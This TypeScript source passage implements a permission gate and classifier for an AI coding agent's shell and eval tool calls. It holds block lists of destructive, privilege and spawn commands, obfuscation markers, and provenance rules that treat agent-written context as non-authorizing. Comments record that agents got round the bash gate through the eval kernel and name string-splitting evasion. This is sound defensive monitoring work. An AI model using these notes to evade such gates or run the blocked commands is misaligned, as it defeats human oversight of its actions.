		return { decision: "block", layer: "environment", hostHandoff: input.headless ? "headless-block" : "permission", why: "caller-supplied environment is not classified" };
	}
	if (input.staticRule === "prompt") {
		return { decision: "block", layer: "rule", hostHandoff: "permission", why: "host static prompt rule matched" };
	}
	if (input.staticRule === "allow") {
		return { decision: "allow", layer: "rule", hostHandoff: "run", why: "host static allow rule matched" };
	}
	if (input.grant) {
		return { decision: "allow", layer: "granted", hostHandoff: "run", why: `${input.grant} grant matched` };
	}
	if (!input.judgement) {
		if (input.approval && input.approval !== "deny" && !input.headless) {
			return { decision: "allow", layer: "approval", hostHandoff: "run", why: `approved by user (${input.approval})` };
		}
		return { decision: "block", layer: "unclassified", hostHandoff: input.headless ? "headless-block" : "permission", why: "classifier unavailable" };
	}
	if (input.judgement.verdict === "SAFE" && !input.priorRefusal && (input.riskFlags?.length ?? 0) === 0) {
		return { decision: "allow", layer: "verdict", hostHandoff: "run", why: input.judgement.reason };
	}
	if (input.approval && input.approval !== "deny" && !input.headless) {
		return { decision: "allow", layer: "approval", hostHandoff: "run", why: `approved by user (${input.approval})` };
	}
	return {
		decision: "block",
		layer: "verdict",
		hostHandoff: input.headless ? "headless-block" : "permission",
		why: input.judgement.verdict === "SAFE" ? "safe verdict requires scoped approval" : input.judgement.reason,
	};
}

// ---------------------------------------------------------------------------
// Provenance-tiered evidence (issue #31)
//
// The state may carry evidence whose fields have different authors, and the
// derivation reads what each tier may mean: userMessages are the
// user's own words and may authorize the action; operatorContext is written by
// the requesting agent and can never authorize anything; priorRefusal is the
// gate's own memory. The CHANNEL decides provenance, never claims inside the
// content — a field claiming authorization is itself an injection signal, and
// the state_contains_injection hazard is what answers for it.
// ---------------------------------------------------------------------------

/** Per-message cap for `evidence.userMessages` entries. */
const EVIDENCE_MESSAGE_MAX_CHARS = 2_000;
/** Cap for the agent-authored `evidence.operatorContext` string. */
const OPERATOR_CONTEXT_MAX_CHARS = 500;

/** Flatten one session message content — a string or an array of typed parts —
 *  to plain text. Non-text parts (images, tool calls) contribute nothing. */
function textOf(content: unknown): string {
	if (typeof content === "string") return content;
	if (!Array.isArray(content)) return "";
	const texts: string[] = [];
	for (const part of content) {
		if (typeof part === "object" && part !== null && "text" in part && typeof part.text === "string") {
			texts.push(part.text);
		}
	}
	return texts.join("\n");
}

/**
 * Index of the first entry after the latest `/clear` boundary, 0 when none.
 * The host rebuilds model context only from after the latest
 * `reset_boundary` (session-context.ts:404), so no live evidence collector
 * may read past it — a cleared request cannot weigh as authorization. One
 * implementation, shared by every collector (#103).
 */
const branchStartAfterLatestResetBoundary = (branch: ReadonlyArray<{ type: string }>): number =>
	branch.findLastIndex(entry => entry.type === "reset_boundary") + 1;

/**
 * The last `limit` user messages on a session branch, oldest first (issue
 * #31): the user-tier evidence a classify record may carry. Pure over the
 * branch entry array so tests pass a fixture instead of a live session. Only
 * `type: "message"` entries with `role: "user"` AND `attribution: "user"` count:
 * a subagent's brief is role "user" but attribution "agent", meaning the parent
 * agent's words, which can never authorize. A message with no attribution is left
 * out too (fail closed). Each is textOf-flattened and capped per
 * EVIDENCE_MESSAGE_MAX_CHARS by keeping its head and tail. The window is the
 * tail: when the branch holds more user messages than `limit`, the newest win.
 * Like collectTaskEvidenceV3 (#101), it reads only what follows the latest
 * `/clear` boundary (#103).
 */
export function collectUserEvidence(
	branch: ReadonlyArray<{ type: string; message?: { role?: string; attribution?: string; content?: unknown } }>,
	limit: number,
): string[] {
	const messages: string[] = [];
	for (let index = branchStartAfterLatestResetBoundary(branch); index < branch.length; index++) {
		const entry = branch[index];
		if (entry.type !== "message") continue;
		const message = entry.message;
		if (message?.role !== "user" || message.attribution !== "user") continue;
		const text = textOf(message.content);
		// An image-only message has no words to quote. Counting it would make the list
		// non-empty and switch on the citation exemptions meant for real user text.
		if (text.trim() === "") continue;
		messages.push(headAndTail(redactSecrets(text), EVIDENCE_MESSAGE_MAX_CHARS));
	}
	return limit > 0 ? messages.slice(-limit) : [];
}

export interface UserEvidenceSnapshot {
	messages: string[];
	/** Stable host entry/message ids when available; synthetic ids are used by
	 *  callers that provide only an in-memory branch fixture. */
	ids: string[];
}

/** Messages that define task scope or later restrictions are durable context,
 * not disposable chat recency. Keep them alongside the normal tail window so
 * "continue", "status?", and "go ahead" cannot evict the instruction they
 * refer to. The hard cap keeps the state bounded. */
const TASK_SCOPE_RE =
	/\b(?:allow|approve|authorized?|authorise|please|must|need(?:s)?|only|do not|don't|never|stop|cancel|revoke|withdraw|no longer|until|scope|for this task|go ahead|proceed|not allowed|forbid|deny)\b/iu;
/** Only durable authorization/restriction language belongs in a grant scope
 * fingerprint. Progress chatter such as "continue" or "status?" must not
 * revoke an otherwise valid user approval. */
const TASK_SCOPE_FINGERPRINT_RE =
	/\b(?:only|must|need(?:s)?|do not|don't|never|stop|cancel|revoke|withdraw|no longer|until|scope|for this task|not allowed|forbid|deny)\b/iu;
const TASK_EVIDENCE_MAX = 8;

type EvidenceBranchEntry = {
	type: string;
	id?: string;
	message?: { id?: string; role?: string; attribution?: string; content?: unknown };
};

export function collectTaskEvidence(branch: ReadonlyArray<EvidenceBranchEntry>, limit: number): UserEvidenceSnapshot {
	if (limit <= 0) return { messages: [], ids: [] };
	const all: Array<{ text: string; id: string; index: number; anchored: boolean }> = [];
	for (let index = branchStartAfterLatestResetBoundary(branch); index < branch.length; index++) {
		const entry = branch[index];
		if (entry.type !== "message") continue;
		const message = entry.message;
		if (message?.role !== "user" || message.attribution !== "user") continue;
		const text = textOf(message.content);
		if (text.trim() === "") continue;
		const id = message.id ?? entry.id ?? `user-${index}`;
		all.push({ text: headAndTail(redactSecrets(text), EVIDENCE_MESSAGE_MAX_CHARS), id, index, anchored: TASK_SCOPE_RE.test(text) });
	}
	if (all.length === 0) return { messages: [], ids: [] };
	const tail = new Set(all.slice(-limit).map(item => item.id));
	const anchors = all.filter(item => item.anchored).slice(-TASK_EVIDENCE_MAX);
	const selected = [...all.filter(item => tail.has(item.id)), ...anchors.filter(item => !tail.has(item.id))]
		.sort((a, b) => a.index - b.index)
		.slice(-TASK_EVIDENCE_MAX);
	return { messages: selected.map(item => item.text), ids: selected.map(item => item.id) };
}

export interface UserEvidenceSnapshotV3 extends UserEvidenceSnapshot {
	/** The first user message since the latest `/clear`, when the newest-8
	 *  slice dropped it. It is positional: whatever the user said first, which
	 *  is where a session usually states its task. It sits outside
	 *  TASK_EVIDENCE_MAX, so later messages can't push it out. It reaches the judges but never a
	 *  literal match: an old request cannot authorize a new command alone. */
	pinned?: { id: string; text: string };
}

/**
 * The jev-v3 evidence builder (plan Phase 2 step 6). It differs from
 * collectTaskEvidence in two ways: it pins the first user message when the
 * slice would drop it, and its collector name records that it feeds the
 * jev-v3 battery. Both builders now read only what follows the latest
 * `/clear` (`reset_boundary`), the way the host rebuilds model context
 * (#103).
 *
 * The plan also asked for task verbs in the anchor pattern. Four review
 * rounds showed a verb list can't converge on intent (every fix traded one
 * miss for another), so anchoring stays jev-v2's scope words, and a task
 * stated mid-session still ages out as it does today (#106).
 * collectTaskEvidence stays as it is, because the jev-v2 shadow baseline
 * reads it.
 */
export function collectTaskEvidenceV3(branch: ReadonlyArray<EvidenceBranchEntry>, limit: number): UserEvidenceSnapshotV3 {
	if (limit <= 0) return { messages: [], ids: [] };
	const all: Array<{ text: string; id: string; index: number; anchored: boolean }> = [];
	const start = branchStartAfterLatestResetBoundary(branch);
	for (let index = start; index < branch.length; index++) {
		const entry = branch[index];
		if (entry.type !== "message") continue;
		const message = entry.message;
		if (message?.role !== "user" || message.attribution !== "user") continue;
		const text = textOf(message.content);
		if (text.trim() === "") continue;
		const id = message.id ?? entry.id ?? `user-${index}`;
		all.push({ text: headAndTail(redactSecrets(text), EVIDENCE_MESSAGE_MAX_CHARS), id, index, anchored: TASK_SCOPE_RE.test(text) });
	}
	if (all.length === 0) return { messages: [], ids: [] };
	const tail = new Set(all.slice(-limit).map(item => item.id));
	const anchors = all.filter(item => item.anchored).slice(-TASK_EVIDENCE_MAX);
	const selected = [...all.filter(item => tail.has(item.id)), ...anchors.filter(item => !tail.has(item.id))]
		.sort((a, b) => a.index - b.index)
		.slice(-TASK_EVIDENCE_MAX);
	const snapshot = { messages: selected.map(item => item.text), ids: selected.map(item => item.id) };
	const first = all[0];
	if (selected.some(item => item.id === first.id)) return snapshot;
	return { ...snapshot, pinned: { id: first.id, text: first.text } };
}

function scopeFingerprint(messages: readonly string[] | undefined): string {
	const durable = (messages ?? []).filter(message => TASK_SCOPE_FINGERPRINT_RE.test(message));
	return evidenceFingerprint(durable.length > 0 ? durable : undefined);
}

/**
 * Agent-authored operator context (issue #31): an optional `operatorContext`
 * string on any tool call input. It is DATA from the requesting agent — the
 * prompt forbids it from authorizing anything — so it is flattened to one
 * line, capped, and absent when the caller sent nothing usable.
 */
export function operatorContextFromInput(value: unknown): string | undefined {
	if (typeof value !== "string") return undefined;
	const flat = value.replace(/\s+/gu, " ").trim();
	return flat === "" ? undefined : truncated(redactSecrets(flat), OPERATOR_CONTEXT_MAX_CHARS);
}

/**
 * Collect bounded, non-authorizing evidence from completed tool activity.
 * User messages are intentionally not mixed into this channel: a write/edit
 * tool's arguments and its result describe what the agent actually did, but
 * they are never permission to do the next thing. Keeping this evidence in
 * the classifier record fixes the common "the file was just written" blind
 * spot without turning agent-authored text into authorization.
 */
export function collectToolEvidence(
	branch: ReadonlyArray<{ type: string; message?: unknown }>,
	maxItems = 6,
): string | undefined {
	if (maxItems <= 0) return undefined;
	const entries: string[] = [];
	const encode = (value: unknown): string => {
		if (typeof value === "string") return value;
		try {
			return JSON.stringify(value ?? {}) ?? "{}";
		} catch {
			return "[unserializable tool arguments]";
		}
	};
	// Every digest covers redacted text. A hash of the raw text would let
	// anyone holding the evidence test password guesses against it offline.
	const digest = (value: string): string => createHash("sha256").update(value).digest("hex").slice(0, 16);
	for (const entry of branch.slice(branchStartAfterLatestResetBoundary(branch))) {
		if (entry.type !== "message") continue;
		if (typeof entry.message !== "object" || entry.message === null) continue;
		const message = entry.message as Record<string, unknown>;
		const role = typeof message.role === "string" ? message.role : "";
		if (role === "assistant" && Array.isArray(message.content)) {
			for (const block of message.content) {
				if (typeof block !== "object" || block === null) continue;
				const toolCall = block as Record<string, unknown>;
				if (toolCall.type !== "toolCall") continue;
				const name = typeof toolCall.name === "string" ? toolCall.name : "tool";
				const args = toolCall.arguments;
				// Structural first, so a value under a secret key goes whole; the
				// text pass then catches what the structure did not name.
				const encoded = redactSecrets(encode(redactValue(args)));
				entries.push(`[tool call ${name} hash=${digest(encoded)}] ${truncated(encoded, 700)}`);
			}
			continue;
		}
		if (role === "toolResult") {
			const name = typeof message.toolName === "string" ? message.toolName : "tool";
			const content = redactSecrets(textOf(message.content));
			if (content.trim() !== "") entries.push(`[tool result ${name} hash=${digest(content)}] ${truncated(content.replace(/\s+/gu, " ").trim(), 700)}`);
			continue;
		}
		if (role === "bashExecution") {
			const command = typeof message.command === "string" ? redactSecrets(message.command) : "";
			const output = typeof message.output === "string" ? redactSecrets(message.output) : "";
			if (command !== "") entries.push(`[bash execution hash=${digest(command)}] ${truncated(command, 700)}`);
			if (output.trim() !== "") entries.push(`[bash output hash=${digest(output)}] ${truncated(output.replace(/\s+/gu, " ").trim(), 500)}`);
		}
	}
	if (entries.length === 0) return undefined;
	return entries.slice(-maxItems).join("\n");
}

/** Merge caller-supplied context with recent tool evidence while preserving
 *  the existing single operatorContext field and its non-authorizing meaning. */
function mergeOperatorContext(explicit: string | undefined, toolEvidence: string | undefined): string | undefined {
	if (!explicit && !toolEvidence) return undefined;
	if (explicit && !toolEvidence) return explicit;
	const parts = [
		explicit ? `operator context: ${explicit}` : "",
		toolEvidence ? `recent tool evidence (non-authorizing): ${toolEvidence}` : "",
	].filter(part => part !== "");
	return truncated(parts.join("\n"), OPERATOR_CONTEXT_MAX_CHARS + 2_500);
}

// Commands that stay in the forced-dialog set even on a classifier SAFE
// verdict: raw disk/device writes (dd, ddrescue, shred, wipefs), privilege
// elevation (sudo), dynamic evaluation (eval), and the shape-scoped rm
// family (rm, unlink — see rmForcesDialog: recursion, globs, `..`, dotfiles
// and provable outside-cwd targets force the dialog; plain named deletions
// do not). Everything else this list used to carry — mv, chmod, chown,
// chattr, truncate, tee, rmdir, curl, wget, git checkout pathspec restores —
// is judged by the model alone ("classifiers are useless if we're just
// adding friction"): a SAFE auto-runs it unless an overlay below claims it,
// and the builtin CRITICAL_BASH_PATTERNS still covers its own list. Anything NOT listed
// (echo, git status/diff/log, cd, pipes, redirects, &&) keeps the graceful
// auto-run path.
//
// Matching is over shell-tokenized segments (tokenizeShellSegments: quotes
// stripped, operators split segments), NOT raw text. The tokenizer does not
// model everything a POSIX shell does, so the matcher normalizes what it can
// and fails closed on structures it cannot: backslash-newline splices are
// removed up front (the shell deletes them; the tokenizer keeps them), words
// with an attached redirect (`rm>/tmp`) are checked by their pre-redirect
// prefix, command substitution in the raw text demotes any risk verb spelled
// anywhere in the command to a flag (`echo "$(rm x)"`), and wrapper commands
// that execute their argument (`env`, `nohup`, `xargs`, `find -exec`) are
// looked through to the binary they name.
const MODERATE_RISK_TOKENS = new Set([
	"rm", "unlink", "dd", "ddrescue", "shred", "wipefs", "sudo", "eval",
]);

// Interpreters that only matter when they execute inline code (-c/-e);
// `bash script.sh` is an ordinary invocation.
const INLINE_CODE_INTERPRETERS = new Set(["python", "python2", "python3", "bash", "sh", "perl"]);

// How one interpreter spells the options that decide what its program operand
// is, for the script-file scan (issue #67 review round 1). One global table
// read every interpreter's flags through one lens, and a flag is only a flag
// for the program that owns it: `-E` is inline code for perl and "ignore the
// PYTHON* environment variables" for python, `-s` is "the program is on stdin"
// for a shell and switch parsing for perl, `-c` is inline code for python and
// a syntax check for perl and ruby. Reading a letter through the wrong
// interpreter's grammar ended the operand scan, so the file the interpreter
// then ran was never read — `python3 -E probe.py` judged the command text
// alone.
interface InterpreterFlagGrammar {
	/** Flags whose value is the program (or stdin): the text travels with the
	 *  command, so the scan stops and the file scan leaves the line alone. */
	inline: RegExp;
	/** Flags that take a SEPARATE value word which is not a program (a warning
	 *  filter, an include directory, a shopt name, an output style). The value
	 *  word is consumed so it cannot be mistaken for the program. A verb whose
	 *  flags all take their value attached carries no entry. */
	value?: RegExp;
	/** Flags that only parse the interpreter's main program. */
	syntaxOnly?: RegExp;
	/** Flags whose value IS a file the interpreter runs, not a setting (`bun
	 *  --preload ./pre.ts`). The value is read like the interpreter's own
	 *  operand — the interpreter opens that file whatever the operand's
	 *  grammatical role — and the program slot is still open for the word after
	 *  it, so `bun --preload ./pre.ts run main.ts` reads both files (round 2
	 *  review). Every value a flag of this class can carry is read, in the
	 *  ATTACHED spellings too: `--preload=./pre.ts` and `-r./pre.ts` name the
	 *  same file in one word, and reading only the separated spelling left the
	 *  preload's code unjudged (round 3 review). The name a caller tests is the
	 *  flag WITHOUT its value (`splitAttachedFlagValue`). */
	file?: RegExp;
	/** True when `-s` means "the program comes from stdin" for this
	 *  interpreter. Only the shells spell it that way: python's `-s`, perl's
	 *  `-s`, ruby's `-s`, and php's `-s` are all something else. */
	stdinFlag: boolean;
}

/** Flags every verb may carry: a lone `-` is the POSIX "read the program from
 *  stdin" spelling for sh, python, perl and php alike, and `--stdin` says the
 *  same thing where a verb has a long form for it. */
const SHARED_INLINE_FLAG = /^-$|^--stdin$/u;

/** php spells inline code `-r`/`-R` and its interactive shell `-a`. `php -f
 *  x.php` names the script in the flag's VALUE, which is deliberately left to
 *  the ordinary operand scan: the word after `-f` is read like any other
 *  program, which is exactly right for a flag whose value IS the program. */
const PHP_INLINE_FLAG = /^-{1,2}(?:r|R|run|a)$/u;

/** The grammars, by verb. `python2`/`python3` share `python`'s entry through
 *  the version-stripped lookup at the call site. A verb with no entry gets no
 *  grammar, which claims nothing: every word after it is read as if it were
 *  the program. That direction is the safe one — a word that is not a file is
 *  skipped for not existing, and a word that is a file gets read. */
const INTERPRETER_FLAG_GRAMMAR: Record<string, InterpreterFlagGrammar> = {
	// POSIX shells: `bash -c '…'`, `bash -s < script`, `bash -o errexit x.sh`.
	bash: { inline: /^-c$|^--command$/u, syntaxOnly: /^-n$/u, value: /^[-+]o$|^[-+]O$|^--rcfile$|^--init-file$/u, stdinFlag: true },
	sh: { inline: /^-c$|^--command$/u, syntaxOnly: /^-n$/u, value: /^[-+]o$|^[-+]O$|^--rcfile$|^--init-file$/u, stdinFlag: true },
	zsh: { inline: /^-c$|^--command$/u, value: /^[-+]o$|^--rcfile$|^--init-file$/u, stdinFlag: true },
	dash: { inline: /^-c$|^--command$/u, value: /^[-+]o$|^--rcfile$|^--init-file$/u, stdinFlag: true },
	ksh: { inline: /^-c$|^--command$/u, value: /^[-+]o$|^--rcfile$|^--init-file$/u, stdinFlag: true },
	fish: { inline: /^-c$|^--command$/u, value: /^-C$|^--init-command$|^--config$/u, stdinFlag: true },
	csh: { inline: /^-c$/u, value: /^-f$/u, stdinFlag: true },
	tcsh: { inline: /^-c$/u, value: /^-f$/u, stdinFlag: true },
	// `python3 -W ignore`, `-X utf8`, `-Q warn`, `--check-hash-based-pycs
	// always`: the value is a setting, never a program. `-m` is handled where
	// the module lookup is (its arguments are not programs either).
	python: { inline: /^-c$|^--command$/u, value: /^-W$|^-X$|^-Q$|^--check-hash-based-pycs$/u, stdinFlag: false },
	// perl: `-e`/`-E` are code; `-I dir` (library path) and `-F pattern` are
	// values; `-s` is switch parsing, `-c` is a syntax check.
	perl: { inline: /^-e$|^-E$|^--eval$/u, value: /^-I$|^-F$|^-M$|^-m$/u, stdinFlag: false },
	// ruby: `-e` is code; `-I dir` (load path) and `-E enc`/`-W level` are
	// settings; `-c` is a syntax check, `-s` switch parsing.
	ruby: { inline: /^-e$|^--eval$/u, syntaxOnly: /^-c$/u, value: /^-I$|^-E$/u, stdinFlag: false },
	// node: `-e`/`-p` are code; `--input-type` and `-C`/`--conditions` are
	// settings; `-r`/`--require` and `--import` preload a FILE and are read as
	// one, in both spellings: the operand scan reads the word after `-r` today,
	// but the attached `--require=./pre.js` names the same file in one word, and
	// nothing read it (round 3 review). Node accepts the attached form for the
	// long spelling only — the short `-r./pre.js` is a syntax error to node —
	// which this table does not need to model, since reading a file the
	// interpreter rejects is the safe direction.
	node: { inline: /^-e$|^--eval$|^-p$|^--print$/u, syntaxOnly: /^--check$/u, value: /^--input-type$|^-C$|^--conditions$|^--title$/u, file: /^-r$|^--require$|^--import$/u, stdinFlag: false },
	deno: { inline: /^-e$|^--eval$|^-p$|^--print$/u, value: /^--ext$|^--config$|^--import-map$|^--v8-flags$/u, stdinFlag: false },
	// `bun --help` here: `-r, --preload=<val>` ("import a module before other
	// modules are loaded") and its Node-compatibility aliases `--require` and
	// `--import` name FILES bun runs, so they are read; `--loader` takes an
	// `.ext:loader` spec (a setting, never a path) and `--cwd` a directory.
	bun: { inline: /^-e$|^--eval$|^-p$|^--print$/u, value: /^--cwd$|^--loader$/u, file: /^--preload$|^-r$|^--require$|^--import$/u, stdinFlag: false },
	// php: the operand scan reads the word after `-f` (`php -f x.php`), and
	// `-f` is the flag that names the script in its VALUE, so it belongs in the
	// file class and is read in its attached spellings too (`php -f=x.php`,
	// `php -fx.php` — both run that file on this machine; round 3 review).
	php: { inline: PHP_INLINE_FLAG, value: /^-c$|^-d$|^-z$|^--php-ini$|^--define$/u, file: /^-f$|^--file$/u, stdinFlag: false },
	// `lua -l mod` loads a module through the interpreter's own path and `-i`
	// is interactive: neither takes a separate value word here, and `--` only
	// ends the options — so no flag of lua's may consume the script operand
	// (`lua -- payload.lua` runs payload.lua; round 2 review).
	lua: { inline: /^-e$/u, stdinFlag: false },
	// `tclsh -encoding utf-8 script.tcl` names the codec in a value.
	tclsh: { inline: /^-e$/u, value: /^-encoding$|^--encoding$/u, stdinFlag: false },
	// `osascript -e 'code'`, `-l language` and `-s style` take values. The
	// synopsis on this machine — `osascript [-l language] [-i] [-s flags] [-e
	// statement | programfile] [argument ...]` — has `-i` as a bare flag
	// (interactive mode), so it must not eat the program file (round 2 review).
	osascript: { inline: /^-e$|^-eosascript$/u, value: /^-l$|^-s$/u, stdinFlag: false },
	// `Rscript -e 'code'`; `--encoding` names a codec.
	rscript: { inline: /^-e$|^--expression$/u, value: /^--encoding$|^--default-packages$/u, stdinFlag: false },
	// `julia -e 'code'`; `-p n`/`-t n` are worker and thread counts.
	julia: { inline: /^-e$|^--eval$/u, value: /^-p$|^--procs$|^-t$|^--threads$|^-O$|^--optimize$/u, stdinFlag: false },
};

// The interpreters that put a subcommand between the verb and the program, and
// the words that are one: `bun run x.ts` (the program is the NEXT word) and
// `deno run x.ts`. `bun run build` resolves a package.json script instead of a
// file, so a word in this position is read only when it IS a readable file.
const INTERPRETER_SUBCOMMANDS: Record<string, Set<string>> = {
	bun: new Set(["run", "x", "exec", "eval", "test", "build", "repl"]),
	deno: new Set(["run", "eval", "test", "bench", "check", "serve", "task", "compile", "bundle", "doc", "fmt", "lint", "repl", "jupyter"]),
};

// Extensions that make a bare word a script even without a path separator: the
// shape `node -r ./pre.js main.js` hides its program behind a flag, and the
// program it loads is the second one. A word that only has the extension is
// read best-effort — the same shape is also an ordinary data argument.
const SCRIPT_FILE_EXTENSION = /\.(?:py|pyw|rb|js|mjs|cjs|ts|mts|cts|tsx|jsx|sh|bash|zsh|fish|dash|ksh|pl|pm|php|lua|tcl|r|jl|ps1|bat|cmd|awk)$/iu;

// Obfuscation and second-execution markers inside inline interpreter code.
// Inline code is fully visible to the classifier — `python3 -c 'print(1)'`
// shows every character it will run — so a SAFE verdict on plain code may
// release it. A payload that decodes or re-execs is NOT the code the model
// read, so the wrapper's SAFE says nothing about what actually runs.
const INTERPRETER_CODE_RISK =
	/exec\(|eval\(|os\.system|subprocess|base64|b64decode|compile\(|__import__|marshal|\\x[0-9a-f]{2}/;

// Same token set as a word-boundary regex, for matching inside joined
// interpreter-code text where a quoted payload arrives as one token
// (`bash -c 'rm -rf x'` tokenizes to a single "rm -rf x" word). \b keeps
// `chmod` from matching inside `immutable` etc.
const INTERPRETER_RISK_TOKEN_RE = new RegExp(
	`\\b(?:${[...MODERATE_RISK_TOKENS].join("|")})\\b`,
	"u",
);

// ---------------------------------------------------------------------------
// Eval-kernel subprocess scan (issue #23, posture A)
//
// The eval tool is host-approved (`eval: allow` under tools.approval) and
// runs code directly in a kernel, so anything bash cannot do silently, eval
// can — unless spawn-bearing eval payloads are gated too. Expression-only
// code (compute, parse, format, plot, local reads) passes with zero added
// cost; spawn-bearing code classifies like a bash command.
//
// The scan is a marker regex, NOT a parser. It admits string-splitting
// evasion ("child_pro"+"cess") the same way the bash gate admits obfuscated
// shell; kernel-level interception (issue #13) is the structural fix. This
// closes the trivial bypass, which is what eight sessions actually used.
//
// Fail-closed direction is deliberately INVERTED from the bash gate: an
// ambiguous payload MISSES the scan and passes. That is the posture-A trade
// — classify-everything taxes the majority of eval usage, which is exactly
// what posture A exists to avoid. The classifier still judges every payload
// the scan does catch.

/** JS (bun kernel): module specifiers, Bun's spawn/shell surfaces, and the
 *  second-execution escapes. Regex `.exec(` is NOT here: it runs no process
 *  and flags ordinary data code. */
const EVAL_SPAWN_MARKERS_JS: Array<[RegExp, string]> = [
	[/child_process/u, "child_process"],
	[/\bBun\s*\.\s*spawn(Sync)?\b/u, "Bun.spawn"],
	[/\bBun\s*\.\s*\$/u, "Bun.$"],
	[/\bFunction\s*\(/u, "Function()"],
	[/\beval\s*\(/u, "eval()"],
	[/\bvm\s*\.\s*(runInThisContext|runInNewContext|compileFunction)\b/u, "vm"],
];

/** PY: the subprocess family, os spawn/exec surfaces, asyncio, and the
 *  dynamic-import escapes (`exec("import subprocess")` is a spawn path). */
const EVAL_SPAWN_MARKERS_PY: Array<[RegExp, string]> = [
	[/\bsubprocess\b/u, "subprocess"],
	[/\bos\s*\.\s*(system|popen|spawn\w*|exec\w*|posix_spawn\w*)\b/u, "os.spawn/exec"],
	[/\bpty\s*\.\s*spawn\b/u, "pty.spawn"],
	[/\basyncio\s*\.\s*create_subprocess\w*/u, "asyncio.create_subprocess"],
	[/\bmultiprocessing\b/u, "multiprocessing"],
	[/\bexec\s*\(/u, "exec()"],
	[/\b__import__\b/u, "__import__"],
	[/\bimportlib\b/u, "importlib"],
];

/** RB/JL: py table plus the shell-literal surfaces those kernels use
 *  (backticks, %x(), Kernel#system, Julia run/read pipelines). */
const EVAL_SPAWN_MARKERS_RB_JL: Array<[RegExp, string]> = [
	...EVAL_SPAWN_MARKERS_PY,
	[/`/u, "backtick shell"],
	[/%x\s*[\({]/u, "%x()"],
	[/\b(system|spawn|popen|open3)\b/iu, "system/spawn/popen"],
	[/\brun\s*\(/u, "run()"],
];

// Word-boundary flags for eval-code that the classifier already judged SAFE.
// Shell tokenization does not apply to program text, so this is a plain scan
// over the moderate-risk verbs minus "eval": the marker scan already routes
// eval()/Function() payloads to the classifier, and flagging the token again
// would dialog every benign dynamic-expression payload.
const EVAL_CODE_FLAG_RE = new RegExp(
	`\\b(?:${[...MODERATE_RISK_TOKENS].filter(t => t !== "eval").join("|")})\\b`,
	"u",
);

export function evalRiskFlags(code: string): string[] {
	const flags = new Set<string>();
	for (const match of code.matchAll(new RegExp(EVAL_CODE_FLAG_RE.source, `${EVAL_CODE_FLAG_RE.flags}g`))) {
		const end = (match.index ?? 0) + match[0].length;
		if (/^\s*(=>|=[^=])/u.test(code.slice(end)) || /^\.\w/u.test(code.slice(end))) continue;
		flags.add(match[0]);
	}
	return [...flags].sort();
}

/**
 * Spawn/second-execution markers inside an eval payload. Empty array = the
 * payload is expression-only as far as this scan can tell, and the gate does
 * not tax it. Names are returned for the permission dialog and logs.
 */
export function evalSubprocessMarkers(code: string, language: string): string[] {
	const scan = (table: Array<[RegExp, string]>): string[] => {
		const found: string[] = [];
		for (const [pattern, name] of table) {
			if (pattern.test(code)) found.push(name);
		}
		return found;
	};
	if (language === "js") return scan(EVAL_SPAWN_MARKERS_JS);
	if (language === "py") return scan(EVAL_SPAWN_MARKERS_PY);
	if (language === "rb" || language === "jl") return scan(EVAL_SPAWN_MARKERS_RB_JL);
	// Unknown or missing language: the payload reached us through a schema the
	// model writes into, so do not trust the label. Scan the union — a false
	// hit costs one dialog; a miss passes a spawn silently.
	const union = [...EVAL_SPAWN_MARKERS_JS, ...EVAL_SPAWN_MARKERS_RB_JL];
	return scan(union);
}

// ---------------------------------------------------------------------------
// The directory an eval payload's spawn runs in (issue #14)
//
// A spawn can pass its own working directory — `subprocess.run(cmd, cwd=…)`,
// `exec(cmd, { cwd: … })`, Ruby `Dir.chdir` and `system(…, chdir: …)`. That
// directory is part of the identity of a judgement: `rm -rf .` in the session
// directory and `rm -rf .` in `/` are different questions, and the same payload
// re-run against a different directory must not reuse the other's verdict. The
// gates below therefore read the payload's own text and judge it in the
// directory the spawns actually run in.
//
// Three outcomes, and the third is the whole point:
//   - a literal, resolved the way the bash path resolves a leading `cd`;
//   - nothing readable at all, which leaves the session directory in force;
//   - UNREADABLE (a computed value, `{ cwd }` shorthand, sites that disagree
//     with each other, an internal-URL directory, an argument list that never
//     closes). That is not a reason to guess: a payload judged against a
//     directory it does not run in was judged on the wrong question, so it
//     asks a human instead of classifying.
//
// The scan is site-scoped where the marker scan is not — a `cwd=` inside a
// string, a comment, or a nested call's arguments must not be read as the
// spawn's directory, which is the same mislabelling error as the issue's,
// pointing the other way. It is still a scan, not a parser: a quoted option key
// (`{ "cwd": … }`) or an alias the scan cannot follow leaves the site reading as
// "no cwd argument", and that is the session directory's answer, not this one.
// Kernel-level interception (issue #13) is the structural fix for that class.
// ---------------------------------------------------------------------------

/** One call whose directory the scan can read. `spawn` sites take an options
 *  key or keyword (`cwd=`/`cwd:`/`chdir:`) that overrides the directory for that
 *  child; `chdir` sites (Ruby `Dir.chdir`) move the payload's OWN directory for
 *  everything after them, which is why the scan walks sites in source order.
 *
 *  The tables below hold the shapes that can NAME a directory — the ones the
 *  issue lists — plus the cwd-less call of the same family. That second part
 *  matters: a payload that declares `/` for one spawn and lets another inherit
 *  the session directory runs in two directories, and the scan has to see both
 *  to say so. Shapes that cannot name one (`os.system`, `pty.spawn`,
 *  `Function()`) are not sites: there is no directory argument to read, and
 *  listing every spawn marker here would dialog every payload that shells out
 *  twice. */
interface EvalCwdSite {
	pattern: RegExp;
	name: string;
	kind: "spawn" | "chdir";
	/** The FIRST argument IS the directory (`Dir.chdir("/tmp")`,
	 *  `` `ls`.cwd("/tmp") ``), not an options key. */
	positional?: true;
	/** Ruby calls parenthesize optionally, so the argument list may be the rest
	 *  of the line (`system "ls", chdir: "/tmp"`). Only Ruby sites set this:
	 *  a parenthesized-looking member access in JS/Python (`subprocess.PIPE`)
	 *  is not a call at all and must not be read as one. */
	parenless?: true;
}

/** JS: the child_process methods (bare after a destructured import, qualified
 *  otherwise) and Bun's shell `cwd()`. `Bun.$` itself is not a site: it takes
 *  its directory from a `.cwd()` chain, which is. */
const EVAL_CWD_SITES_JS: EvalCwdSite[] = [
	{ pattern: /(?:^|[^\w.$])(?:spawn|spawnSync|exec|execSync|execFile|execFileSync|fork)\b/u, name: "spawn/exec", kind: "spawn" },
	{ pattern: /\.\s*(?:spawn|spawnSync|exec|execSync|execFile|execFileSync|fork)\b/u, name: "child_process", kind: "spawn" },
	{ pattern: /\.\s*cwd\b/u, name: "shell cwd()", kind: "spawn", positional: true },
];

/** PY: the subprocess family, asyncio's subprocess helpers, and the bare names
 *  a `from subprocess import run` leaves behind. Every entry here can NAME a
 *  directory (`cwd=`); `os.system`/`os.popen`/`pty.spawn` cannot, and a shape
 *  that cannot name one has nothing for this scan to read — see the site-table
 *  note above. */
